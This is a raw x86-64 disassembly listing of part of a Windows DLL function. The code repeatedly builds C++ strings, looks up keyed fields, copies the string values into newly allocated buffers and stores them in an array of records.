   1800042bc:	c6 85 30 01 00 00 00 	movb   $0x0,0x130(%rbp)
   1800042c3:	4c 89 ad 60 01 00 00 	mov    %r13,0x160(%rbp)
   1800042ca:	4c 89 ad 70 01 00 00 	mov    %r13,0x170(%rbp)
   1800042d1:	45 8b e7             	mov    %r15d,%r12d
   1800042d4:	4c 89 bd 78 01 00 00 	mov    %r15,0x178(%rbp)
   1800042db:	c6 85 60 01 00 00 00 	movb   $0x0,0x160(%rbp)
   1800042e2:	83 3b 05             	cmpl   $0x5,(%rbx)
   1800042e5:	0f 85 20 0d 00 00    	jne    0x18000500b
   1800042eb:	4c 8b 73 08          	mov    0x8(%rbx),%r14
   1800042ef:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   1800042f4:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   1800042f9:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   1800042fe:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   180004303:	45 8d 47 02          	lea    0x2(%r15),%r8d
   180004307:	48 8d 15 1a eb 03 00 	lea    0x3eb1a(%rip),%rdx        # 0x180042e28
   18000430e:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   180004313:	e8 78 49 00 00       	call   0x180008c90
   180004318:	90                   	nop
   180004319:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   18000431e:	48 8d 95 98 00 00 00 	lea    0x98(%rbp),%rdx
   180004325:	49 8b ce             	mov    %r14,%rcx
   180004328:	e8 f3 55 00 00       	call   0x180009920
   18000432d:	48 8b 10             	mov    (%rax),%rdx
   180004330:	83 7a 40 03          	cmpl   $0x3,0x40(%rdx)
   180004334:	0f 85 b0 0c 00 00    	jne    0x180004fea
   18000433a:	48 8b 52 48          	mov    0x48(%rdx),%rdx
   18000433e:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   180004342:	e8 f9 3e 00 00       	call   0x180008240
   180004347:	48 8b d0             	mov    %rax,%rdx
   18000434a:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   18000434e:	e8 8d f2 ff ff       	call   0x1800035e0
   180004353:	48 8d 8d 30 01 00 00 	lea    0x130(%rbp),%rcx
   18000435a:	48 3b c8             	cmp    %rax,%rcx
   18000435d:	74 27                	je     0x180004386
   18000435f:	0f 10 00             	movups (%rax),%xmm0
   180004362:	0f 11 85 30 01 00 00 	movups %xmm0,0x130(%rbp)
   180004369:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   18000436d:	0f 11 8d 40 01 00 00 	movups %xmm1,0x140(%rbp)
   180004374:	4c 89 68 10          	mov    %r13,0x10(%rax)
   180004378:	4c 89 78 18          	mov    %r15,0x18(%rax)
   18000437c:	c6 00 00             	movb   $0x0,(%rax)
   18000437f:	4c 8b bd 48 01 00 00 	mov    0x148(%rbp),%r15
   180004386:	48 8b 55 b8          	mov    -0x48(%rbp),%rdx
   18000438a:	48 83 fa 10          	cmp    $0x10,%rdx
   18000438e:	72 31                	jb     0x1800043c1
   180004390:	48 ff c2             	inc    %rdx
   180004393:	48 8b 4d a0          	mov    -0x60(%rbp),%rcx
   180004397:	48 8b c1             	mov    %rcx,%rax
   18000439a:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800043a1:	72 19                	jb     0x1800043bc
   1800043a3:	48 83 c2 27          	add    $0x27,%rdx
   1800043a7:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1800043ab:	48 2b c1             	sub    %rcx,%rax
   1800043ae:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1800043b2:	48 83 f8 1f          	cmp    $0x1f,%rax
   1800043b6:	0f 87 7d 0b 00 00    	ja     0x180004f39
   1800043bc:	e8 cb 84 00 00       	call   0x18000c88c
   1800043c1:	4c 89 6d b0          	mov    %r13,-0x50(%rbp)
   1800043c5:	48 c7 45 b8 0f 00 00 	movq   $0xf,-0x48(%rbp)
   1800043cc:	00 
   1800043cd:	c6 45 a0 00          	movb   $0x0,-0x60(%rbp)
   1800043d1:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   1800043d6:	48 83 fa 10          	cmp    $0x10,%rdx
   1800043da:	72 32                	jb     0x18000440e
   1800043dc:	48 ff c2             	inc    %rdx
   1800043df:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1800043e4:	48 8b c1             	mov    %rcx,%rax
   1800043e7:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800043ee:	72 19                	jb     0x180004409
   1800043f0:	48 83 c2 27          	add    $0x27,%rdx
   1800043f4:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1800043f8:	48 2b c1             	sub    %rcx,%rax
   1800043fb:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1800043ff:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004403:	0f 87 36 0b 00 00    	ja     0x180004f3f
   180004409:	e8 7e 84 00 00       	call   0x18000c88c
   18000440e:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   180004413:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   180004418:	48 c7 44 24 40 0f 00 	movq   $0xf,0x40(%rsp)
   18000441f:	00 00 
   180004421:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   180004426:	41 b8 11 00 00 00    	mov    $0x11,%r8d
   18000442c:	48 8d 15 0d ea 03 00 	lea    0x3ea0d(%rip),%rdx        # 0x180042e40
   180004433:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   180004438:	e8 53 48 00 00       	call   0x180008c90
   18000443d:	90                   	nop
   18000443e:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   180004443:	48 8d 55 78          	lea    0x78(%rbp),%rdx
   180004447:	49 8b ce             	mov    %r14,%rcx
   18000444a:	e8 d1 54 00 00       	call   0x180009920
   18000444f:	48 8b 10             	mov    (%rax),%rdx
   180004452:	83 7a 40 03          	cmpl   $0x3,0x40(%rdx)
   180004456:	0f 85 6d 0b 00 00    	jne    0x180004fc9
   18000445c:	48 8b 52 48          	mov    0x48(%rdx),%rdx
   180004460:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   180004464:	e8 d7 3d 00 00       	call   0x180008240
   180004469:	48 8b d0             	mov    %rax,%rdx
   18000446c:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   180004470:	e8 6b f1 ff ff       	call   0x1800035e0
   180004475:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   18000447c:	48 3b c8             	cmp    %rax,%rcx
   18000447f:	74 2b                	je     0x1800044ac
   180004481:	0f 10 00             	movups (%rax),%xmm0
   180004484:	0f 11 85 60 01 00 00 	movups %xmm0,0x160(%rbp)
   18000448b:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   18000448f:	0f 11 8d 70 01 00 00 	movups %xmm1,0x170(%rbp)
   180004496:	4c 89 68 10          	mov    %r13,0x10(%rax)
   18000449a:	48 c7 40 18 0f 00 00 	movq   $0xf,0x18(%rax)
   1800044a1:	00 
   1800044a2:	c6 00 00             	movb   $0x0,(%rax)
   1800044a5:	4c 8b a5 78 01 00 00 	mov    0x178(%rbp),%r12
   1800044ac:	48 8b 55 b8          	mov    -0x48(%rbp),%rdx
   1800044b0:	48 83 fa 10          	cmp    $0x10,%rdx
   1800044b4:	72 31                	jb     0x1800044e7
   1800044b6:	48 ff c2             	inc    %rdx
   1800044b9:	48 8b 4d a0          	mov    -0x60(%rbp),%rcx
   1800044bd:	48 8b c1             	mov    %rcx,%rax
   1800044c0:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800044c7:	72 19                	jb     0x1800044e2
   1800044c9:	48 83 c2 27          	add    $0x27,%rdx
   1800044cd:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1800044d1:	48 2b c1             	sub    %rcx,%rax
   1800044d4:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1800044d8:	48 83 f8 1f          	cmp    $0x1f,%rax
   1800044dc:	0f 87 63 0a 00 00    	ja     0x180004f45
   1800044e2:	e8 a5 83 00 00       	call   0x18000c88c
   1800044e7:	4c 89 6d b0          	mov    %r13,-0x50(%rbp)
   1800044eb:	48 c7 45 b8 0f 00 00 	movq   $0xf,-0x48(%rbp)
   1800044f2:	00 
   1800044f3:	c6 45 a0 00          	movb   $0x0,-0x60(%rbp)
   1800044f7:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   1800044fc:	48 83 fa 10          	cmp    $0x10,%rdx
   180004500:	72 32                	jb     0x180004534
   180004502:	48 ff c2             	inc    %rdx
   180004505:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   18000450a:	48 8b c1             	mov    %rcx,%rax
   18000450d:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004514:	72 19                	jb     0x18000452f
   180004516:	48 83 c2 27          	add    $0x27,%rdx
   18000451a:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   18000451e:	48 2b c1             	sub    %rcx,%rax
   180004521:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004525:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004529:	0f 87 1c 0a 00 00    	ja     0x180004f4b
   18000452f:	e8 58 83 00 00       	call   0x18000c88c
   180004534:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   180004539:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   18000453e:	48 c7 44 24 40 0f 00 	movq   $0xf,0x40(%rsp)
   180004545:	00 00 
   180004547:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   18000454c:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   180004552:	48 8d 15 ff e8 03 00 	lea    0x3e8ff(%rip),%rdx        # 0x180042e58
   180004559:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   18000455e:	e8 2d 47 00 00       	call   0x180008c90
   180004563:	90                   	nop
   180004564:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   180004569:	48 8d 55 68          	lea    0x68(%rbp),%rdx
   18000456d:	49 8b ce             	mov    %r14,%rcx
   180004570:	e8 ab 53 00 00       	call   0x180009920
   180004575:	48 8b 10             	mov    (%rax),%rdx
   180004578:	83 7a 40 03          	cmpl   $0x3,0x40(%rdx)
   18000457c:	0f 85 26 0a 00 00    	jne    0x180004fa8
   180004582:	48 8b 52 48          	mov    0x48(%rdx),%rdx
   180004586:	48 8d 8d b0 02 00 00 	lea    0x2b0(%rbp),%rcx
   18000458d:	e8 ae 3c 00 00       	call   0x180008240
   180004592:	90                   	nop
   180004593:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   180004598:	48 83 fa 10          	cmp    $0x10,%rdx
   18000459c:	72 32                	jb     0x1800045d0
   18000459e:	48 ff c2             	inc    %rdx
   1800045a1:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1800045a6:	48 8b c1             	mov    %rcx,%rax
   1800045a9:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800045b0:	72 19                	jb     0x1800045cb
   1800045b2:	48 83 c2 27          	add    $0x27,%rdx
   1800045b6:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1800045ba:	48 2b c1             	sub    %rcx,%rax
   1800045bd:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1800045c1:	48 83 f8 1f          	cmp    $0x1f,%rax
   1800045c5:	0f 87 86 09 00 00    	ja     0x180004f51
   1800045cb:	e8 bc 82 00 00       	call   0x18000c88c
   1800045d0:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   1800045d5:	48 c7 44 24 40 0f 00 	movq   $0xf,0x40(%rsp)
   1800045dc:	00 00 
   1800045de:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   1800045e3:	48 8b bd c0 02 00 00 	mov    0x2c0(%rbp),%rdi
   1800045ea:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   1800045ee:	e8 5d 86 00 00       	call   0x18000cc50
   1800045f3:	48 8b f0             	mov    %rax,%rsi
   1800045f6:	48 8d 95 b0 02 00 00 	lea    0x2b0(%rbp),%rdx
   1800045fd:	48 83 bd c8 02 00 00 	cmpq   $0x10,0x2c8(%rbp)
   180004604:	10 
   180004605:	0f 93 44 24 25       	setae  0x25(%rsp)
   18000460a:	48 8b 85 b0 02 00 00 	mov    0x2b0(%rbp),%rax
   180004611:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   180004616:	48 0f 43 d0          	cmovae %rax,%rdx
   18000461a:	4c 8d 47 01          	lea    0x1(%rdi),%r8
   18000461e:	48 8b ce             	mov    %rsi,%rcx
   180004621:	e8 0a b3 00 00       	call   0x18000f930
   180004626:	48 85 f6             	test   %rsi,%rsi
   180004629:	48 8d 3d a3 e4 03 00 	lea    0x3e4a3(%rip),%rdi        # 0x180042ad3
   180004630:	48 0f 44 f7          	cmove  %rdi,%rsi
   180004634:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   18000463b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004640:	49 ff c0             	inc    %r8
   180004643:	42 80 3c 06 00       	cmpb   $0x0,(%rsi,%r8,1)
   180004648:	75 f6                	jne    0x180004640
   18000464a:	48 8b d6             	mov    %rsi,%rdx
   18000464d:	48 8d 8d f0 00 00 00 	lea    0xf0(%rbp),%rcx
   180004654:	e8 37 46 00 00       	call   0x180008c90
   180004659:	4c 89 ad 80 01 00 00 	mov    %r13,0x180(%rbp)
   180004660:	4c 89 ad 90 01 00 00 	mov    %r13,0x190(%rbp)
   180004667:	48 c7 85 98 01 00 00 	movq   $0xf,0x198(%rbp)
   18000466e:	0f 00 00 00 
   180004672:	c6 85 80 01 00 00 00 	movb   $0x0,0x180(%rbp)
   180004679:	45 33 c0             	xor    %r8d,%r8d
   18000467c:	48 8b d7             	mov    %rdi,%rdx
   18000467f:	48 8d 8d 80 01 00 00 	lea    0x180(%rbp),%rcx
   180004686:	e8 05 46 00 00       	call   0x180008c90
   18000468b:	90                   	nop
   18000468c:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   180004691:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   180004696:	48 c7 44 24 40 0f 00 	movq   $0xf,0x40(%rsp)
   18000469d:	00 00 
   18000469f:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   1800046a4:	41 b8 09 00 00 00    	mov    $0x9,%r8d
   1800046aa:	48 8d 15 b7 e7 03 00 	lea    0x3e7b7(%rip),%rdx        # 0x180042e68
   1800046b1:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   1800046b6:	e8 d5 45 00 00       	call   0x180008c90
   1800046bb:	90                   	nop
   1800046bc:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   1800046c1:	48 8d 95 88 00 00 00 	lea    0x88(%rbp),%rdx
   1800046c8:	49 8b ce             	mov    %r14,%rcx
   1800046cb:	e8 50 52 00 00       	call   0x180009920
   1800046d0:	48 8b 08             	mov    (%rax),%rcx
   1800046d3:	8b 79 40             	mov    0x40(%rcx),%edi
   1800046d6:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   1800046db:	48 83 fa 10          	cmp    $0x10,%rdx
   1800046df:	72 32                	jb     0x180004713
   1800046e1:	48 ff c2             	inc    %rdx
   1800046e4:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1800046e9:	48 8b c1             	mov    %rcx,%rax
   1800046ec:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800046f3:	72 19                	jb     0x18000470e
   1800046f5:	48 83 c2 27          	add    $0x27,%rdx
   1800046f9:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1800046fd:	48 2b c1             	sub    %rcx,%rax
   180004700:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004704:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004708:	0f 87 49 08 00 00    	ja     0x180004f57
   18000470e:	e8 79 81 00 00       	call   0x18000c88c
   180004713:	85 ff                	test   %edi,%edi
   180004715:	0f 84 bd 00 00 00    	je     0x1800047d8
   18000471b:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   180004720:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   180004725:	48 c7 44 24 40 0f 00 	movq   $0xf,0x40(%rsp)
   18000472c:	00 00 
   18000472e:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   180004733:	41 b8 09 00 00 00    	mov    $0x9,%r8d
   180004739:	48 8d 15 28 e7 03 00 	lea    0x3e728(%rip),%rdx        # 0x180042e68
   180004740:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   180004745:	e8 46 45 00 00       	call   0x180008c90
   18000474a:	90                   	nop
   18000474b:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   180004750:	48 8d 95 b8 00 00 00 	lea    0xb8(%rbp),%rdx
   180004757:	49 8b ce             	mov    %r14,%rcx
   18000475a:	e8 c1 51 00 00       	call   0x180009920
   18000475f:	4c 8b 00             	mov    (%rax),%r8
   180004762:	41 83 78 40 03       	cmpl   $0x3,0x40(%r8)
   180004767:	0f 85 f6 07 00 00    	jne    0x180004f63
   18000476d:	4d 8b 40 48          	mov    0x48(%r8),%r8
   180004771:	48 8d 85 80 01 00 00 	lea    0x180(%rbp),%rax
   180004778:	49 3b c0             	cmp    %r8,%rax
   18000477b:	74 1e                	je     0x18000479b
   18000477d:	49 8b d0             	mov    %r8,%rdx
   180004780:	49 83 78 18 10       	cmpq   $0x10,0x18(%r8)
   180004785:	72 03                	jb     0x18000478a
   180004787:	49 8b 10             	mov    (%r8),%rdx
   18000478a:	4d 8b 40 10          	mov    0x10(%r8),%r8
   18000478e:	48 8d 8d 80 01 00 00 	lea    0x180(%rbp),%rcx
   180004795:	e8 f6 44 00 00       	call   0x180008c90
   18000479a:	90                   	nop
   18000479b:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   1800047a0:	48 83 fa 10          	cmp    $0x10,%rdx
   1800047a4:	72 32                	jb     0x1800047d8
   1800047a6:	48 ff c2             	inc    %rdx
   1800047a9:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1800047ae:	48 8b c1             	mov    %rcx,%rax
   1800047b1:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800047b8:	72 19                	jb     0x1800047d3
   1800047ba:	48 83 c2 27          	add    $0x27,%rdx
   1800047be:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1800047c2:	48 2b c1             	sub    %rcx,%rax
   1800047c5:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1800047c9:	48 83 f8 1f          	cmp    $0x1f,%rax
   1800047cd:	0f 87 8a 07 00 00    	ja     0x180004f5d
   1800047d3:	e8 b4 80 00 00       	call   0x18000c88c
   1800047d8:	48 8b bd 90 01 00 00 	mov    0x190(%rbp),%rdi
   1800047df:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   1800047e3:	e8 68 84 00 00       	call   0x18000cc50
   1800047e8:	48 8b f0             	mov    %rax,%rsi
   1800047eb:	48 8d 95 80 01 00 00 	lea    0x180(%rbp),%rdx
   1800047f2:	48 83 bd 98 01 00 00 	cmpq   $0x10,0x198(%rbp)
   1800047f9:	10 
   1800047fa:	0f 93 44 24 24       	setae  0x24(%rsp)
   1800047ff:	4c 8b ad 80 01 00 00 	mov    0x180(%rbp),%r13
   180004806:	49 0f 43 d5          	cmovae %r13,%rdx
   18000480a:	4c 8d 47 01          	lea    0x1(%rdi),%r8
   18000480e:	48 8b c8             	mov    %rax,%rcx
   180004811:	e8 1a b1 00 00       	call   0x18000f930
   180004816:	48 85 f6             	test   %rsi,%rsi
   180004819:	48 8d 05 b3 e2 03 00 	lea    0x3e2b3(%rip),%rax        # 0x180042ad3
   180004820:	48 0f 44 f0          	cmove  %rax,%rsi
   180004824:	48 c7 c7 ff ff ff ff 	mov    $0xffffffffffffffff,%rdi
   18000482b:	4c 8b c7             	mov    %rdi,%r8
   18000482e:	66 90                	xchg   %ax,%ax
   180004830:	49 ff c0             	inc    %r8
   180004833:	42 80 3c 06 00       	cmpb   $0x0,(%rsi,%r8,1)
   180004838:	75 f6                	jne    0x180004830
   18000483a:	48 8b d6             	mov    %rsi,%rdx
   18000483d:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   180004844:	e8 47 44 00 00       	call   0x180008c90
   180004849:	48 8d 85 30 01 00 00 	lea    0x130(%rbp),%rax
   180004850:	49 83 ff 10          	cmp    $0x10,%r15
   180004854:	0f 93 44 24 21       	setae  0x21(%rsp)
   180004859:	4c 8b bd 30 01 00 00 	mov    0x130(%rbp),%r15
   180004860:	48 83 bd 48 01 00 00 	cmpq   $0x10,0x148(%rbp)
   180004867:	10 
   180004868:	49 0f 43 c7          	cmovae %r15,%rax
   18000486c:	48 8b cf             	mov    %rdi,%rcx
   18000486f:	90                   	nop
   180004870:	48 ff c1             	inc    %rcx
   180004873:	80 3c 08 00          	cmpb   $0x0,(%rax,%rcx,1)
   180004877:	75 f7                	jne    0x180004870
   180004879:	48 ff c1             	inc    %rcx
   18000487c:	e8 cf 83 00 00       	call   0x18000cc50
   180004881:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180004886:	48 8d 95 60 01 00 00 	lea    0x160(%rbp),%rdx
   18000488d:	49 83 fc 10          	cmp    $0x10,%r12
   180004891:	0f 93 44 24 20       	setae  0x20(%rsp)
   180004896:	4c 8b b5 60 01 00 00 	mov    0x160(%rbp),%r14
   18000489d:	49 0f 43 d6          	cmovae %r14,%rdx
   1800048a1:	48 8b cf             	mov    %rdi,%rcx
   1800048a4:	48 ff c1             	inc    %rcx
   1800048a7:	80 3c 0a 00          	cmpb   $0x0,(%rdx,%rcx,1)
   1800048ab:	75 f7                	jne    0x1800048a4
   1800048ad:	48 ff c1             	inc    %rcx
   1800048b0:	e8 9b 83 00 00       	call   0x18000cc50
   1800048b5:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   1800048b9:	48 8d 95 f0 00 00 00 	lea    0xf0(%rbp),%rdx
   1800048c0:	48 83 bd 08 01 00 00 	cmpq   $0x10,0x108(%rbp)
   1800048c7:	10 
   1800048c8:	0f 93 44 24 23       	setae  0x23(%rsp)
   1800048cd:	48 8b b5 f0 00 00 00 	mov    0xf0(%rbp),%rsi
   1800048d4:	48 0f 43 d6          	cmovae %rsi,%rdx
   1800048d8:	48 8b cf             	mov    %rdi,%rcx
   1800048db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800048e0:	48 ff c1             	inc    %rcx
   1800048e3:	80 3c 0a 00          	cmpb   $0x0,(%rdx,%rcx,1)
   1800048e7:	75 f7                	jne    0x1800048e0
   1800048e9:	48 ff c1             	inc    %rcx
   1800048ec:	e8 5f 83 00 00       	call   0x18000cc50
   1800048f1:	48 89 45 88          	mov    %rax,-0x78(%rbp)
   1800048f5:	48 8d 95 10 01 00 00 	lea    0x110(%rbp),%rdx
   1800048fc:	48 83 bd 28 01 00 00 	cmpq   $0x10,0x128(%rbp)
   180004903:	10 
   180004904:	0f 93 44 24 22       	setae  0x22(%rsp)
   180004909:	48 8b bd 10 01 00 00 	mov    0x110(%rbp),%rdi
   180004910:	48 0f 43 d7          	cmovae %rdi,%rdx
   180004914:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   18000491b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004920:	48 ff c1             	inc    %rcx
   180004923:	80 3c 0a 00          	cmpb   $0x0,(%rdx,%rcx,1)
   180004927:	75 f7                	jne    0x180004920
   180004929:	48 ff c1             	inc    %rcx
   18000492c:	e8 1f 83 00 00       	call   0x18000cc50
   180004931:	4c 8b e0             	mov    %rax,%r12
   180004934:	48 8d 8d 30 01 00 00 	lea    0x130(%rbp),%rcx
   18000493b:	80 7c 24 21 00       	cmpb   $0x0,0x21(%rsp)
   180004940:	74 08                	je     0x18000494a
   180004942:	49 8b d7             	mov    %r15,%rdx
   180004945:	49 8b cf             	mov    %r15,%rcx
   180004948:	eb 07                	jmp    0x180004951
   18000494a:	48 8d 95 30 01 00 00 	lea    0x130(%rbp),%rdx
   180004951:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   180004958:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000495f:	00 
   180004960:	49 ff c0             	inc    %r8
   180004963:	42 80 3c 01 00       	cmpb   $0x0,(%rcx,%r8,1)
   180004968:	75 f6                	jne    0x180004960
   18000496a:	49 ff c0             	inc    %r8
   18000496d:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   180004972:	e8 b9 af 00 00       	call   0x18000f930
   180004977:	48 8d 85 60 01 00 00 	lea    0x160(%rbp),%rax
   18000497e:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   180004983:	74 08                	je     0x18000498d
   180004985:	49 8b d6             	mov    %r14,%rdx
   180004988:	49 8b c6             	mov    %r14,%rax
   18000498b:	eb 07                	jmp    0x180004994
   18000498d:	48 8d 95 60 01 00 00 	lea    0x160(%rbp),%rdx
   180004994:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   18000499b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800049a0:	49 ff c0             	inc    %r8
   1800049a3:	42 80 3c 00 00       	cmpb   $0x0,(%rax,%r8,1)
   1800049a8:	75 f6                	jne    0x1800049a0
   1800049aa:	49 ff c0             	inc    %r8
   1800049ad:	48 8b 4d 80          	mov    -0x80(%rbp),%rcx
   1800049b1:	e8 7a af 00 00       	call   0x18000f930
   1800049b6:	48 8d 85 f0 00 00 00 	lea    0xf0(%rbp),%rax
   1800049bd:	80 7c 24 23 00       	cmpb   $0x0,0x23(%rsp)
   1800049c2:	74 08                	je     0x1800049cc
   1800049c4:	48 8b d6             	mov    %rsi,%rdx
   1800049c7:	48 8b c6             	mov    %rsi,%rax
   1800049ca:	eb 07                	jmp    0x1800049d3
   1800049cc:	48 8d 95 f0 00 00 00 	lea    0xf0(%rbp),%rdx
   1800049d3:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   1800049da:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1800049e0:	49 ff c0             	inc    %r8
   1800049e3:	42 80 3c 00 00       	cmpb   $0x0,(%rax,%r8,1)
   1800049e8:	75 f6                	jne    0x1800049e0
   1800049ea:	49 ff c0             	inc    %r8
   1800049ed:	48 8b 4d 88          	mov    -0x78(%rbp),%rcx
   1800049f1:	e8 3a af 00 00       	call   0x18000f930
   1800049f6:	48 8d 85 10 01 00 00 	lea    0x110(%rbp),%rax
   1800049fd:	80 7c 24 22 00       	cmpb   $0x0,0x22(%rsp)
   180004a02:	74 08                	je     0x180004a0c
   180004a04:	48 8b d7             	mov    %rdi,%rdx
   180004a07:	48 8b c7             	mov    %rdi,%rax
   180004a0a:	eb 07                	jmp    0x180004a13
   180004a0c:	48 8d 95 10 01 00 00 	lea    0x110(%rbp),%rdx
   180004a13:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   180004a1a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180004a20:	49 ff c0             	inc    %r8
   180004a23:	42 80 3c 00 00       	cmpb   $0x0,(%rax,%r8,1)
   180004a28:	75 f6                	jne    0x180004a20
   180004a2a:	49 ff c0             	inc    %r8
   180004a2d:	49 8b cc             	mov    %r12,%rcx
   180004a30:	e8 fb ae 00 00       	call   0x18000f930
   180004a35:	4c 8b 45 90          	mov    -0x70(%rbp),%r8
   180004a39:	49 8b c0             	mov    %r8,%rax
   180004a3c:	48 c1 e0 05          	shl    $0x5,%rax
   180004a40:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   180004a45:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   180004a4a:	48 89 0c 10          	mov    %rcx,(%rax,%rdx,1)
   180004a4e:	48 8b 4d 80          	mov    -0x80(%rbp),%rcx
   180004a52:	48 89 4c 10 08       	mov    %rcx,0x8(%rax,%rdx,1)
   180004a57:	48 8b 4d 88          	mov    -0x78(%rbp),%rcx
   180004a5b:	48 89 4c 10 10       	mov    %rcx,0x10(%rax,%rdx,1)
   180004a60:	4c 89 64 10 18       	mov    %r12,0x18(%rax,%rdx,1)
   180004a65:	ff 44 24 48          	incl   0x48(%rsp)
   180004a69:	49 ff c0             	inc    %r8
   180004a6c:	4c 89 45 90          	mov    %r8,-0x70(%rbp)
   180004a70:	44 8b 64 24 58       	mov    0x58(%rsp),%r12d
   180004a75:	41 ff c4             	inc    %r12d
   180004a78:	44 89 64 24 58       	mov    %r12d,0x58(%rsp)
   180004a7d:	80 7c 24 24 00       	cmpb   $0x0,0x24(%rsp)
   180004a82:	74 38                	je     0x180004abc
   180004a84:	48 8b 95 98 01 00 00 	mov    0x198(%rbp),%rdx
   180004a8b:	48 ff c2             	inc    %rdx
   180004a8e:	49 8b c5             	mov    %r13,%rax
   180004a91:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004a98:	72 19                	jb     0x180004ab3
   180004a9a:	48 83 c2 27          	add    $0x27,%rdx
   180004a9e:	4d 8b 6d f8          	mov    -0x8(%r13),%r13
   180004aa2:	49 2b c5             	sub    %r13,%rax
   180004aa5:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004aa9:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004aad:	0f 87 d1 04 00 00    	ja     0x180004f84
   180004ab3:	49 8b cd             	mov    %r13,%rcx
   180004ab6:	e8 d1 7d 00 00       	call   0x18000c88c
